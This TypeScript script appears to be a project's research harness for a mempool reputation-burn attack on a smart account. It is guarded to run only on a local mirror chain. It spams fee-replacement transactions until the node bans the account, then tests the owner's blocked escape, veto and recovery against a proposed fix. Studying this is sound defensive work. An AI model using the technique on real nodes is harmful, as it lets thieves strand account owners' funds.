/**
 * A thief with only the daily key gets the account banned on a node, so that the node refuses the owner's escape, veto and recovery.
 *
 * Each admission counts as seen against the payer, a replacement included, and a ban needs only floor(seen / 10) > included + 50.
 * Below ten wei the sidecar's 10% bump rounds down to nothing, so a thief can replace one transaction at the same fee, as often as
 * they like. This runs on the mirror only.
 *
 *     vajra rep-burn         the ban, and everything it refuses, with a separate payer tried too
 *     vajra rep-burn fixed   the same, then the second route: a sender the thief cannot touch
 *     vajra rep-burn rule    the same attack on a sidecar running docs/upstream/sidecar-reputation.patch: `VAJRA_SIDECAR_RULE=1 make judge`
 */
import { writeFileSync } from "node:fs";
import { type Address, type Hex, encodeFunctionData, formatEther, keccak256, parseEther, toHex } from "viem";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";
import * as lib from "@forshtat/hegota-support/tx";
import {
  DEVNET,
  ETH,
  type FrameTx,
  LEGACY_GAS_PRICE,
  RpcError,
  Scope,
  accountAbi,
  accountState,
  createExit,
  dailyTx,
  deployments,
  framesSucceeded,
  isLocalStack,
  leafNonceKey,
  masterDigest,
  masterTx,
  ops,
  opsV2,
  profile,
  publicClient,
  receiptOf,
  recoveryGate,
  exitTicket,
  recoveryTicket,
  recoveryTx,
  refusalNameV2,
  sendAlt,
  sendCanonical,
  sigHash,
  signDaily,
  signDailyTx,
  signExitTx,
  signMasterTx,
  sleep,
  submit,
  txHash,
  waitForSuccess,
  walletFor,
  withMasterSignature,
} from "@vajra/core";
import { loadOrCreateKey } from "@vajra/core/node";
import { keyPath } from "./deploy.ts";
import { V2_STAKE } from "./wallet.ts";
import { proveRecovery, randomFieldElement, recoveryCommitment, stopProver } from "./proving.ts";
import { master, newAccount, newSigner, reputationOf } from "./zk-run.ts";

if (!isLocalStack) throw new Error("this is an attack: it runs on the local mirror only, with VAJRA_STACK=local");

const fixed = process.argv.includes("fixed");
const rule = process.argv.includes("rule");
const MAX_ADMISSIONS = rule ? 700 : 1500;
const deployer = loadOrCreateKey(keyPath("deployer.key"));
const { v2, genesis } = deployments();
const fresh = () => privateKeyToAccount(generatePrivateKey()).address;
const dailyKey = generatePrivateKey();
const daily = privateKeyToAccount(dailyKey).address;
const signer = newSigner();
const harbor = fresh();
const harborSalt = keccak256(toHex("harbor"));
const account = await newAccount(deployer, signer, daily, harbor, harborSalt, parseEther("2"));
const { epochSalt } = await accountState(account);
console.log(`account ${account}`);

const verdict = async (label: string, send: () => Promise<unknown>) => {
  const outcome = await send().then(
    (hash) => `ADMITTED ${hash}`,
    (error: Error) => `REFUSED ${(error instanceof RpcError ? refusalNameV2(error.message) : error.message).slice(0, 160)}`,
  );
  console.log(`  ${label}: ${outcome}`);
  return outcome;
};

// What the owner set up before anything went wrong: a paper, and, on the fixed run, the second route.
const paper = randomFieldElement();
await submit(master(signer, account, epochSalt, [opsV2.setRecovery(await recoveryCommitment(paper), 60n, recoveryGate(recoveryTicket(paper)))]));
const exitTree = newSigner();
let exit: Address | null = null;
if (fixed) {
  exit = await createExit(deployer, v2!.exitFactory!, account, exitTree.root, epochSalt, parseEther("0.05"), V2_STAKE);
  await submit(master(signer, account, epochSalt, [opsV2.setExit(exit)]));
  console.log(`second route ${exit}, its own tree, 0.05 ETH of its own, and a stake so that it can carry a recovery`);
}

// A proof made while the master key is still here stands in for the day it is gone.
const newTree = newSigner();
const proved = await proveRecovery({ secret: paper, newRoot: newTree.root, account, epochSalt, chainId: DEVNET.chainId });
await stopProver();

// Over the limit, so it waits in public, and something for the owner to veto.
const stolen = await submit(await signDaily({ key: dailyKey, dailyKey: daily, account, calls: [ops.spend(ETH, fresh(), parseEther("0.6"))] }));
const queuedId = 0n;
console.log(`the thief queues 0.6 ETH, ${stolen.hash}`);

const start = await reputationOf(account);
console.log(`\nBefore: seen ${start.opsSeen}, included ${start.opsIncluded}, ${start.status}`);

console.log("\n1. The thief replaces one transaction, at 9 wei, over and over");
const startedAt = Date.now();
const nonceBefore = await publicClient.getTransactionCount({ address: account });
const balanceBefore = await publicClient.getBalance({ address: account });
let admitted = 0;
let refusedCount = 0;
let lastRefusal: string | null = null;
let rep = start;
// On the rule's sidecar a bump has to be a real one, so the fee climbs by a tenth there. The cap on a daily transaction ends that ladder soon enough.
let fee = { maxFeePerGas: 9n, maxPriorityFeePerGas: 0n };
for (let i = 0; i < MAX_ADMISSIONS; i++) {
  const nonce = BigInt(await publicClient.getTransactionCount({ address: account }));
  if (rule) fee = { ...fee, maxFeePerGas: fee.maxFeePerGas + fee.maxFeePerGas / 10n + 1n };
  const tx = await signDailyTx(dailyTx({ account, dailyKey: daily, nonce, calls: [ops.spend(ETH, daily, BigInt(i))], fees: fee }), dailyKey);
  await sendAlt(tx).then(
    () => admitted++,
    (error: Error) => {
      refusedCount++;
      lastRefusal = error.message.slice(0, 120);
    },
  );
  if (rule && refusedCount > 10) break;
  if (i % 25 === 24) {
    rep = await reputationOf(account);
    if (i % 100 === 99) console.log(`  ${admitted} admitted, seen ${rep.opsSeen}, included ${rep.opsIncluded}, ${rep.status}`);
    if (rep.status === "banned") break;
  }
}
rep = await reputationOf(account);
const seconds = (Date.now() - startedAt) / 1000;
const minedByThief = (await publicClient.getTransactionCount({ address: account })) - nonceBefore;
await sleep(3000);
const spentOnFees = balanceBefore - (await publicClient.getBalance({ address: account }));
console.log(`  ${admitted} admitted in ${seconds.toFixed(1)}s, ${refusedCount} refused, ${minedByThief} of them mined, ${spentOnFees} wei of fees paid by the account`);
console.log(`  seen ${rep.opsSeen}, included ${rep.opsIncluded}, status ${rep.status}`);
if (lastRefusal) console.log(`  last refusal: ${lastRefusal}`);

console.log("\n2. What the owner can still do, on this node");
const escape = signMasterTx({ signer, account, epochSalt, calls: [ops.escape(harbor, harborSalt)], maxHashes: 520 }).tx;
const veto = signMasterTx({ signer, account, epochSalt, calls: [ops.veto(queuedId)], maxHashes: 520 }).tx;
const recovery = recoveryTx({ account, newRoot: newTree.root, nullifier: proved.nullifier, proof: proved.proof, ticket: recoveryTicket(paper) });
const outcomes: Record<string, string> = {};
await sleep(rule ? 4000 : 0);
outcomes.vetoDirect = await verdict("veto, from the account", () => sendAlt(veto));
outcomes.recovery = await verdict("recovery, by proof", () => sendAlt(recovery));

// The other idea: keep the account as sender, and let someone else pay. The paymaster sponsors exactly this account's code.
const code = await publicClient.getCode({ address: account });
const load = (name: string) => import(`../../core/src/artifacts/${name}.json`, { with: { type: "json" } }).then((m) => m.default as { abi: never; bytecode: Hex });
const artifact = await load("SponsorPaymaster");
const paymasterHash = await walletFor(deployer).deployContract({ abi: artifact.abi, bytecode: artifact.bytecode, args: [keccak256(code!)] as never, value: parseEther("0.05"), gas: 30_000_000n, gasPrice: LEGACY_GAS_PRICE, type: "legacy" });
const paymaster = (await waitForSuccess(paymasterHash, "placing a paymaster")).contractAddress!;
const leaf = signer.nextLeaf();
const sponsoredBase = masterTx({ account, root: signer.root, leaf, calls: [ops.freeze()] });
const sponsored: FrameTx = {
  ...sponsoredBase,
  frames: [
    lib.frame(profile, "VERIFY", { scope: "EXECUTION", execution: 99_900n, data: encodeFunctionData({ abi: accountAbi, functionName: "validateMaster", args: [Scope.Execution] }) }),
    lib.frame(profile, "VERIFY", { scope: "PAYMENT", target: paymaster, execution: 60_000n, data: keccak256(toHex("sponsor()")).slice(0, 10) as Hex }),
    ...sponsoredBase.frames.slice(1),
  ],
};
const signedSponsored = withMasterSignature(sponsored, signer.sign(leaf, masterDigest({ chainId: DEVNET.chainId, epochSalt, account, nonceKey: leafNonceKey(signer.root, leaf), sigHash: sigHash(sponsored) })));
outcomes.separatePayer = await verdict("freeze, the account as sender, a paymaster paying", () => sendAlt(signedSponsored));

// The canonical mempool keeps no reputation, so a banned owner goes there, and that is where a pending thief transaction holds the sender.
console.log("\n3. The canonical mempool, with a thief transaction pending");
const head = await publicClient.getBlockNumber();
while ((await publicClient.getBlockNumber()) === head) await sleep(100);
const base = (await publicClient.getBlock()).baseFeePerGas ?? 7n;
const pin = await signDailyTx(
  dailyTx({ account, dailyKey: daily, nonce: BigInt(await publicClient.getTransactionCount({ address: account })), calls: [ops.spend(ETH, daily, 1n)], fees: { maxFeePerGas: base + 1n, maxPriorityFeePerGas: 0n } }),
  dailyKey,
);
outcomes.pin = await verdict("thief's transaction", () => sendCanonical(pin));
outcomes.escapeCanonical = await verdict("escape, canonical", () => sendCanonical(escape));
outcomes.escapeAlt = await verdict("escape, alt", () => sendAlt(escape));

let exitResult: Record<string, unknown> | null = null;
if (fixed) {
  console.log("\n4. The second route, in the same slot");
  const exitVeto = signExitTx({ signer: exitTree, exit: exit!, account, epochSalt, calls: [ops.veto(queuedId)] });
  const exitEscape = signExitTx({ signer: exitTree, exit: exit!, account, epochSalt, calls: [ops.escape(harbor, harborSalt)] });
  const exitRecovery = recoveryTx({ account, exit: exit!, newRoot: newTree.root, nullifier: proved.nullifier, proof: proved.proof, ticket: exitTicket(paper) });
  outcomes.exitVeto = await verdict("veto, from the exit, alt", () => sendAlt(exitVeto.tx));
  outcomes.exitRecovery = await verdict("recovery, from the exit, alt", () => sendAlt(exitRecovery));
  outcomes.exitEscape = await verdict("escape, from the exit, canonical", () => sendCanonical(exitEscape.tx));
  for (const [label, tx] of [["veto", exitVeto.tx], ["recovery", exitRecovery], ["escape", exitEscape.tx]] as const) {
    let receipt = await receiptOf(txHash(tx));
    for (let i = 0; i < 30 && !receipt; i++) {
      await sleep(1000);
      receipt = await receiptOf(txHash(tx));
    }
    console.log(`  ${label}: ${receipt ? `mined in block ${Number(BigInt(receipt.blockNumber))}, all frames ok: ${framesSucceeded(receipt)}, VERIFY ${Number(BigInt(receipt.frameReceipts[0]!.gasUsed))} gas` : "NOT MINED"}`);
  }
  const landed = await publicClient.getBalance({ address: harbor });
  console.log(`  harbor holds ${formatEther(landed)} ETH, account frozen: ${(await accountState(account)).frozen}, exit reputation ${(await reputationOf(exit!)).status}`);
  exitResult = { harbor: landed.toString(), frozen: (await accountState(account)).frozen };
}

const name = rule ? "sidecar-rule" : fixed ? "fixed" : "attack";
writeFileSync(
  new URL(`../../../docs/evidence/rep-burn-${name}-latest.json`, import.meta.url),
  JSON.stringify(
    {
      ranAt: new Date().toISOString(),
      stack: `local mirror: ethrex 9aa3645 + sidecar 2e22ff0 with sidecar-budget-010.patch${rule ? " and sidecar-reputation.patch" : ""}. NOT run on the public devnet`,
      chainId: DEVNET.chainId,
      account,
      exit,
      admitted,
      refused: refusedCount,
      seconds,
      minedByThief,
      feesPaidByAccount: spentOnFees.toString(),
      reputation: rep,
      outcomes,
      exitResult,
    },
    null,
    1,
  ) + "\n",
);
process.exit(0);
